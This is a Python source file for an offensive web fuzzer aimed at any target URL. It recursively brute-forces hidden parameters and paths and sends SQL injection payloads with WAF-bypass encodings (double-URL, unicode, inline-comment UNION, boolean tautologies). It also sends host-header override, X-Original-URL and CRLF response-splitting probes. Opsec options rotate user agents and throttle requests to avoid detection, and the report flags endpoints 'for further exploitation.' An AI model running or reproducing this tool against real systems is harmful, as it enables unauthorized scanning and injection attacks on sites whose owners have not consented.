#!/usr/bin/env python3
"""
Automated Web Fuzzer — Parameter Discovery & Recursive Path Enumeration

MITRE ATT&CK Mapping:
  T1595 - Active Scanning (parameter brute-forcing and path discovery)
  T1190 - Exploit Public-Facing Application (identifying unsecured endpoints)

Fuzzes target URLs for hidden parameters and paths using a built-in wordlist.
Supports recursion, status code differentiation, and response length analysis.
"""

import argparse
import json
import os
import re
import signal
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

init(autoreset=True)

_PIPELINE = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..', 'pipeline'))
if _PIPELINE not in sys.path:
    sys.path.insert(0, _PIPELINE)
try:
    from modules import opsec
except ImportError:
    import opsec

OPSEC_PROFILE = None


def _profile():
    return OPSEC_PROFILE if OPSEC_PROFILE is not None else opsec.DEFAULT


def _session():
    global _OPSEC_SESSION
    try:
        return _OPSEC_SESSION
    except NameError:
        _OPSEC_SESSION = opsec.http_session(_profile())
        return _OPSEC_SESSION


def _throttled_get(url, **kwargs):
    return opsec.throttled(_session(), url, method="GET", profile=_profile(), **kwargs)


def _workers(default=10):
    return 1 if _profile().name == opsec.Profile.QUIET else default


SHOULD_EXIT = False
BANNER = f"""{Fore.RED}
    _   _ ___ _____ ___ _  _ ___   ___        _    ___
   /_\\ | _ \\_   _| __| \\| | __| |/ _ \\ _ _  (_)__| __|
  / _ \\|   / | | | _|| .` | _|| | (_) | ' \\ | / _| _|
 /_/ \\_\\_|_\\ |_| |___|_|\\_|___|_|\\___/|_||_|/_\\__|___|
{Fore.RESET}"""

# Built-in wordlist of common web parameters
BUILTIN_PARAM_WORDLIST = [
    "id", "page", "user", "admin", "query", "q", "s", "search", "debug",
    "token", "key", "api", "action", "mode", "type", "file", "path",
    "dir", "cmd", "exec", "command", "lang", "locale", "session", "auth",
    "pass", "password", "secret", "redirect", "url", "next", "return",
    "callback", "format", "output", "ajax", "xhr", "template", "view",
    "include", "load", "import", "config", "setting", "option", "sort",
    "limit", "start", "offset", "pageNo", "pageNumber", "page_index",
    "order", "by", "filter", "field", "value", "data", "json", "xml",
    "method", "_method", "do", "fn", "func", "function", "process",
    "class", "module", "app", "controller", "handler", "route",
    "api_key", "apikey", "apiKey", "access_token", "accessToken",
    "refresh_token", "refreshToken", "client_id", "clientId",
    "client_secret", "clientSecret", "scope", "state", "nonce",
    "username", "email", "name", "first_name", "last_name",
    "role", "permission", "group", "org", "organization",
    "file_name", "filename", "upload", "download", "import",
    "export", "backup", "restore", "sign", "verify", "validate",
    "check", "test", "edit", "delete", "remove", "create", "add",
    "update", "submit", "send", "preview", "draft", "publish",
    "enable", "disable", "flag", "feature", "toggle", "switch",
    "raw", "plain", "min", "max", "default", "list", "get",
    "set", "pay", "payment", "price", "amount", "currency",
    "shipping", "billing", "cart", "checkout", "orderId",
    "transaction", "ref", "reference", "invoice", "receipt",
]

# Path wordlist for recursive fuzzing
BUILTIN_PATH_WORDLIST = [
    "admin", "api", "v1", "v2", "v3", "login", "logout", "dashboard",
    "config", "settings", "user", "users", "account", "profile",
    "upload", "download", "backup", "logs", "log", "debug",
    "test", "dev", "staging", "private", "internal", "secure",
    "js", "css", "static", "assets", "images", "img", "fonts",
    "swagger", "docs", "api-docs", "openapi.json", "graphql",
    "rest", "soap", "xmlrpc", "wsdl", "health", "status",
    "metrics", "info", "version", "robots.txt", "sitemap.xml",
    ".well-known", "security.txt", "callback", "webhook",
    "oauth", "saml", "auth", "sso", "connect", "token",
    "password-reset", "forgot-password", "signup", "register",
    "proxy", "gateway", "tunnel", "websocket", "ws", "socket",
    "redirect", "forward", "service", "services", "api/health",
]

# Parameters probed with encoding vectors (WSTG-INPV-05 injection points)
SQLI_PROBE_PARAMS = [
    "id", "q", "search", "name", "user", "page", "category", "file",
    "path", "sort", "order", "email",
]

# Double-URL / nested encoding and case/hex/unicode SQLi vectors
# (WSTG-INPV-05 step 4 manual payloads and WAF-bypass techniques)
ENCODED_SQLI_VECTORS = [
    ("quote", "'"),
    ("url-encoded", "%27"),
    ("double-url-encoded", "%2527"),
    ("unicode-u", "%u0027"),
    ("hex", "0x27"),
    ("bool-true", "' OR '1'='1"),
    ("bool-false", "' OR '1'='2"),
    ("bool-double-encoded", "%2527%2520OR%2520%25271%2527%253D%25271"),
    ("case-mix-union", "' UnIoN SeLeCt NULL--"),
    ("inline-comment-union", "' UN/**/ION SEL/**/ECT NULL--"),
    ("unicode-bool", "%u0027 OR %u00271%u0027=%u00271"),
    ("hex-bool", "' OR 0x31=0x31--"),
    ("null-byte-prefix", "%00'"),
    ("tab-whitespace", "'\tOR\t'1'='1"),
    ("scientific-notation", "1e0' OR '1'='1"),
]

# Database error fingerprints (WSTG-INPV-05 step 2 error patterns)
DB_ERROR_PATTERNS = {
    "MySQL": [re.compile(p, re.I) for p in (
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version")],
    "PostgreSQL": [re.compile(p, re.I) for p in (
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError:")],
    "MSSQL": [re.compile(p, re.I) for p in (
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
        r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark after the character string")],
    "Oracle": [re.compile(p, re.I) for p in (
        r"\bORA-[0-9]{4}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_.*", r"Warning.*\Wora_.*")],
    "SQLite": [re.compile(p, re.I) for p in (
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException", r"Warning.*sqlite_.*",
        r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]")],
}

# Header-injection fuzz vectors (WSTG-INPV-17 host header, WSTG-INPV-15 CRLF)
INJECTION_MARKER = "pwnmarker-1f3a"
HOST_OVERRIDE_HEADERS = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-HTTP-Host-Override"]
PATH_OVERRIDE_HEADERS = ["X-Original-URL", "X-Rewrite-URL"]
REFLECTION_PROBE_HEADERS = ["Referer", "User-Agent", "X-Forwarded-For", "From"]
CRLF_VECTORS = [
    ("url-encoded-crlf", f"%0d%0aSet-Cookie:%20{INJECTION_MARKER}=1"),
    ("lf-only", f"%0aSet-Cookie:%20{INJECTION_MARKER}=1"),
    ("utf8-overlong-crlf", f"%E5%98%8A%E5%98%8DSet-Cookie:%20{INJECTION_MARKER}=1"),
    ("double-encoded-crlf", f"%250d%250aSet-Cookie:%20{INJECTION_MARKER}=1"),
]
CRLF_PROBE_PARAMS = ["next", "url"]


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def fetch_baseline(target_url, timeout_sec):
    """Fetch URL without parameters to establish baseline."""
    try:
        resp = _throttled_get(target_url, timeout=timeout_sec)
        return resp.status_code, len(resp.text), resp.text[:200]
    except requests.RequestException:
        return None, None, None


def fuzz_params(target_url, wordlist, timeout_sec, baseline_length):
    """Fuzz for parameters and return responses with notable differences."""
    results = []
    baseline_status, baseline_len, _ = fetch_baseline(target_url, timeout_sec)

    def test_param(param):
        if SHOULD_EXIT:
            return None
        try:
            probe_url = target_url + ("&" if "?" in target_url else "?") + urllib.parse.urlencode({param: "test"})
            resp = _throttled_get(probe_url, timeout=timeout_sec)
            body_length = len(resp.text)
            status_change = resp.status_code != baseline_status
            length_diff = abs(body_length - (baseline_len or 0))
            interesting = (
                status_change or
                length_diff > 100 or
                resp.status_code in (200, 403, 500) or
                "error" in resp.text.lower()[:500] or
                "exception" in resp.text.lower()[:500]
            )
            return {
                "param": param,
                "status": resp.status_code,
                "length": body_length,
                "interesting": interesting,
                "status_change": status_change,
                "length_diff": length_diff,
            }
        except requests.RequestException:
            return None

    with ThreadPoolExecutor(max_workers=_workers()) as executor:
        future_map = {executor.submit(test_param, p): p for p in wordlist}
        for future in as_completed(future_map):
            if SHOULD_EXIT:
                break
            try:
                result = future.result()
                if result:
                    results.append(result)
            except Exception:
                pass

    return results


def fuzz_paths(base_url, wordlist, timeout_sec, max_depth=1, current_depth=0):
    """Recursively fuzz paths on the target."""
    discovered = []

    def test_path(path_fragment):
        if SHOULD_EXIT:
            return None
        try:
            if base_url.endswith("/"):
                full_url = base_url + path_fragment.lstrip("/")
            else:
                full_url = base_url + "/" + path_fragment.lstrip("/")
            resp = _throttled_get(full_url, timeout=timeout_sec, allow_redirects=False)
            interesting = resp.status_code in (200, 403, 401, 500, 301, 302)
            return {
                "path": path_fragment,
                "full_url": full_url,
                "status": resp.status_code,
                "length": len(resp.text),
                "interesting": interesting,
            }
        except requests.RequestException:
            return None

    with ThreadPoolExecutor(max_workers=_workers()) as executor:
        future_map = {executor.submit(test_path, p): p for p in wordlist}
        for future in as_completed(future_map):
            if SHOULD_EXIT:
                break
            try:
                result = future.result()
                if result and result["interesting"]:
                    discovered.append(result)
            except Exception:
                pass

    # Recurse on discovered interesting paths (200s and dirs)
    if current_depth < max_depth:
        for entry in discovered:
            if SHOULD_EXIT:
                break
            if entry["status"] == 200 or entry["status"] == 301 or entry["status"] == 302:
                deep_results = fuzz_paths(
                    entry["full_url"].rstrip("/"),
                    wordlist, timeout_sec, max_depth, current_depth + 1
                )
                discovered.extend(deep_results)

    return discovered


# --- New techniques (sourced from 16-wstg methodology docs) ---

def fuzz_encoded_params(target_url, timeout_sec):
    """WSTG-INPV-05: double-URL/nested encoding + case/hex/unicode SQLi vectors.

    Payloads are pre-encoded strings sent raw (no extra quoting) so
    double-encoding and %u-unicode vectors reach the server as crafted.
    Boolean-blind detection compares the bool-true vs bool-false responses.
    """
    probes = [(param, label, payload) for param in SQLI_PROBE_PARAMS for label, payload in ENCODED_SQLI_VECTORS]
    baseline_status, baseline_len, _ = fetch_baseline(target_url, timeout_sec)
    separator = "&" if "?" in target_url else "?"
    all_results = []

    def run_probe(item):
        if SHOULD_EXIT:
            return None
        param, label, payload = item
        probe_url = f"{target_url}{separator}{param}={payload}"
        try:
            resp = _throttled_get(probe_url, timeout=timeout_sec, allow_redirects=True)
            text = resp.text or ""
            db_error = None
            for db, patterns in DB_ERROR_PATTERNS.items():
                if any(pattern.search(text) for pattern in patterns):
                    db_error = db
                    break
            length_diff = abs(len(text) - (baseline_len or 0))
            status_anomaly = baseline_status is not None and resp.status_code != baseline_status and resp.status_code >= 400
            notable = bool(db_error) or status_anomaly or length_diff > 150
            return {"param": param, "vector": label, "payload": payload[:60], "status": resp.status_code, "length": len(text), "length_diff": length_diff, "db_error": db_error, "notable": notable}
        except requests.RequestException:
            return None

    with ThreadPoolExecutor(max_workers=_workers()) as executor:
        future_map = {executor.submit(run_probe, item): item for item in probes}
        for future in as_completed(future_map):
            if SHOULD_EXIT:
                break
            try:
                probe_result = future.result()
                if probe_result:
                    all_results.append(probe_result)
            except Exception:
                pass

    # Boolean-blind analysis: true vs false response divergence per parameter
    by_param = {}
    for probe_result in all_results:
        by_param.setdefault(probe_result["param"], {})[probe_result["vector"]] = probe_result
    for param, vectors in by_param.items():
        true_resp = vectors.get("bool-true")
        false_resp = vectors.get("bool-false")
        if true_resp and false_resp and true_resp["status"] == false_resp["status"] and abs(true_resp["length"] - false_resp["length"]) > 50:
            all_results.append({"param": param, "vector": "boolean-length-diff", "payload": f"{true_resp['payload']} vs {false_resp['payload']}", "status": true_resp["status"], "length": true_resp["length"], "length_diff": abs(true_resp["length"] - false_resp["length"]), "db_error": None, "notable": True})

    return [probe_result for probe_result in all_results if probe_result["notable"]]


def fuzz_header_injection(target_url, timeout_sec):
    """WSTG-INPV-17 + WSTG-INPV-15: host override, path override, CRLF splitting.

    Raw CRLF bytes are never placed in URLs (HTTP clients sanitize them);
    only URL-safe encodings of the vectors are sent.
    """
    findings = []
    baseline_status, baseline_len, _ = fetch_baseline(target_url, timeout_sec)

    # Host override reflection (WSTG-INPV-17 / attack-host-header)
    for header in HOST_OVERRIDE_HEADERS:
        if SHOULD_EXIT:
            break
        try:
            resp = _throttled_get(target_url, timeout=timeout_sec, headers={header: f"{INJECTION_MARKER}.example.com"}, allow_redirects=True)
            if INJECTION_MARKER in (resp.text or ""):
                findings.append({"type": "host_override_reflection", "header": header, "status": resp.status_code, "evidence": INJECTION_MARKER})
        except requests.RequestException:
            continue

    # Path override response change (X-Original-URL / X-Rewrite-URL)
    for header in PATH_OVERRIDE_HEADERS:
        if SHOULD_EXIT:
            break
        try:
            resp = _throttled_get(target_url, timeout=timeout_sec, headers={header: "/admin"}, allow_redirects=True)
            length_diff = abs(len(resp.text or "") - (baseline_len or 0))
            if baseline_status is not None and (resp.status_code != baseline_status or length_diff > 200):
                findings.append({"type": "path_override_response_change", "header": header, "status": resp.status_code, "baseline_status": baseline_status, "length_diff": length_diff})
        except requests.RequestException:
            continue

    # Header value reflection probes (log/echo discovery)
    for header in REFLECTION_PROBE_HEADERS:
        if SHOULD_EXIT:
            break
        try:
            resp = _throttled_get(target_url, timeout=timeout_sec, headers={header: f"reflection-probe-{INJECTION_MARKER}"}, allow_redirects=True)
            if INJECTION_MARKER in (resp.text or ""):
                findings.append({"type": "header_value_reflection", "header": header, "status": resp.status_code, "evidence": f"reflection-probe-{INJECTION_MARKER}"})
        except requests.RequestException:
            continue

    # CRLF response splitting vectors (WSTG-INPV-15)
    separator = "&" if "?" in target_url else "?"
    for param in CRLF_PROBE_PARAMS:
        for label, vector in CRLF_VECTORS:
            if SHOULD_EXIT:
                break
            try:
                resp = _throttled_get(f"{target_url}{separator}{param}={vector}", timeout=timeout_sec, allow_redirects=True)
                header_blob = "\n".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
                body = (resp.text or "").lower()
                if f"{INJECTION_MARKER}=1" in header_blob or f"set-cookie: {INJECTION_MARKER}" in header_blob or f"{INJECTION_MARKER}=1" in body:
                    findings.append({"type": "crlf_response_splitting", "param": param, "vector": label, "status": resp.status_code, "evidence": "injected header observed in response"})
            except requests.RequestException:
                continue
    return findings


def run_scan(target_url, timeout_sec, max_depth):
    """Run full fuzzing scan."""
    print(f"\n{Fore.RED}[*] Target: {target_url}{Style.RESET_ALL}")
    print(f"{Fore.RED}[*] Parameters wordlist: {len(BUILTIN_PARAM_WORDLIST)} | Paths wordlist: {len(BUILTIN_PATH_WORDLIST)}")
    print(f"{Fore.RED}[*] Recursion depth: {max_depth}{Style.RESET_ALL}")

    print(f"\n  {Fore.CYAN}[1/2] Fuzzing for parameters...{Style.RESET_ALL}")
    param_results = fuzz_params(target_url, BUILTIN_PARAM_WORDLIST, timeout_sec, None)

    print(f"\n  {Fore.CYAN}[2/2] Fuzzing for paths...{Style.RESET_ALL}")
    path_results = fuzz_paths(target_url, BUILTIN_PATH_WORDLIST, timeout_sec, max_depth)

    print(f"\n  {Fore.CYAN}[+3] Encoded SQLi / encoding-vector fuzzing (WSTG-INPV-05)...{Style.RESET_ALL}")
    sqli_hits = fuzz_encoded_params(target_url, timeout_sec)

    print(f"\n  {Fore.CYAN}[+4] Header injection fuzzing (WSTG-INPV-15/17)...{Style.RESET_ALL}")
    header_findings = fuzz_header_injection(target_url, timeout_sec)

    interesting_params = [r for r in param_results if r.get("interesting")]
    interesting_paths = [r for r in path_results if r.get("interesting")]

    result = {
        "target": target_url,
        "params_tested": len(param_results),
        "interesting_params": interesting_params,
        "paths_tested": len(path_results),
        "interesting_paths": interesting_paths,
        "encoded_vectors_tested": len(SQLI_PROBE_PARAMS) * len(ENCODED_SQLI_VECTORS),
        "sqli_error_hits": sqli_hits,
        "header_injection_hits": header_findings,
    }

    print(f"\n  {Fore.CYAN}  Parameter Fuzzing Results:{Style.RESET_ALL}")
    print(f"  Total responses: {len(param_results)}")
    print(f"  {Fore.YELLOW}  Interesting: {len(interesting_params)}{Style.RESET_ALL}")
    if interesting_params:
        print()
        for p in interesting_params[:20]:
            change = f" status_change={p['status_change']} diff={p['length_diff']}"
            print(f"  [{p['status']}] {p['param']}{Fore.YELLOW}{change}{Style.RESET_ALL}")

    print(f"\n  {Fore.CYAN}  Path Fuzzing Results:{Style.RESET_ALL}")
    print(f"  Total: {len(path_results)} | {Fore.YELLOW}Interesting: {len(interesting_paths)}{Style.RESET_ALL}")
    if interesting_paths:
        print()
        for p in interesting_paths[:20]:
            print(f"  [{p['status']}] /{p['path']:<25} ({p['length']} bytes)")

    print(f"\n  {Fore.CYAN}  Encoded Vector Results (WSTG-INPV-05):{Style.RESET_ALL}")
    print(f"  Hits (DB errors / anomalies / boolean diffs): {len(sqli_hits)}")
    if sqli_hits:
        print()
        for hit in sqli_hits[:15]:
            db = f" DB={hit['db_error']}" if hit.get("db_error") else ""
            print(f"  [{hit['status']}] {hit['param']} [{hit['vector']}] diff={hit.get('length_diff', 0)}{db}")

    print(f"\n  {Fore.CYAN}  Header Injection Results (WSTG-INPV-15/17):{Style.RESET_ALL}")
    print(f"  Hits: {len(header_findings)}")
    if header_findings:
        print()
        for finding in header_findings[:15]:
            detail = finding.get("header") or finding.get("vector") or ""
            print(f"  [{finding['type']}] {detail} status={finding.get('status', '?')}")

    return result


def print_report(result):
    """Print final assessment."""
    if not result:
        return
    print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.RED}  AUTOMATED WEB FUZZING REPORT{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    print(f"  Target  : {result['target']}")
    print(f"  Params tested  : {result['params_tested']}")
    print(f"  Paths tested   : {result['paths_tested']}")
    print(f"  Interesting params: {len(result['interesting_params'])}")
    print(f"  Interesting paths : {len(result['interesting_paths'])}")

    total_interesting = len(result['interesting_params']) + len(result['interesting_paths'])
    if total_interesting > 0:
        print(f"\n  {Fore.RED}VERDICT: {total_interesting} interesting endpoints/parameters found{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  Review the highlighted results above. Endpoints returning 200,{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  403, or 500 merit closer investigation for further exploitation.{Style.RESET_ALL}")
    else:
        print(f"\n  {Fore.GREEN}VERDICT: No interesting deviations detected{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}  Responses were uniform across all tested parameters and paths.{Style.RESET_ALL}")

    sqli_hits = result.get('sqli_error_hits') or []
    header_hits = result.get('header_injection_hits') or []
    print(f"\n  Encoded vectors tested : {result.get('encoded_vectors_tested', 0)}")
    print(f"  SQLi/encoding hits     : {len(sqli_hits)}")
    print(f"  Header injection hits  : {len(header_hits)}")
    if sqli_hits:
        print(f"\n  {Fore.RED}Encoded SQLi / encoding-vector findings (WSTG-INPV-05):{Style.RESET_ALL}")
        for hit in sqli_hits[:15]:
            db = f" (DB: {hit['db_error']})" if hit.get('db_error') else ""
            print(f"  [{hit['status']}] {hit['param']} [{hit['vector']}] diff={hit.get('length_diff', 0)}{db}")
    if header_hits:
        print(f"\n  {Fore.RED}Header injection findings (WSTG-INPV-15/17):{Style.RESET_ALL}")
        for finding in header_hits[:15]:
            detail = finding.get('header') or finding.get('vector') or ""
            print(f"  [{finding['type']}] {detail} status={finding.get('status', '?')}")


def main():
    parser = argparse.ArgumentParser(
        description="Automated Web Fuzzer — Parameter & Path Discovery — MITRE T1595, T1190",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python agent.py -u https://target.com/page
  python agent.py -u https://target.com/api -t 15 --depth 2
  python agent.py -u https://target.com/app -o results.json
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout (default: 10)")
    parser.add_argument("--depth", type=int, default=1, help="Recursion depth (default: 1)")
    parser.add_argument("-o", "--output", help="Save to JSON")
    noise = parser.add_mutually_exclusive_group()
    noise.add_argument('--quiet', dest='profile', action='store_const', const='quiet',
                       help='QUIET: 2.0s+-1.0s delay, fixed UA, no aggressive checks')
    noise.add_argument('--moderate', dest='profile', action='store_const', const='moderate',
                       help='MODERATE: 0.5s+-0.25s delay, rotating UA (default)')
    noise.add_argument('--loud', dest='profile', action='store_const', const='loud',
                       help='LOUD: no artificial delay, full parallelism')
    parser.set_defaults(profile='moderate')
    args = parser.parse_args()
    globals()["OPSEC_PROFILE"] = opsec.Profile(args.profile)
    opsec.apply(_profile())

    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    result = run_scan(args.url, args.timeout, args.depth)
    print_report(result)
    if args.output and result:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
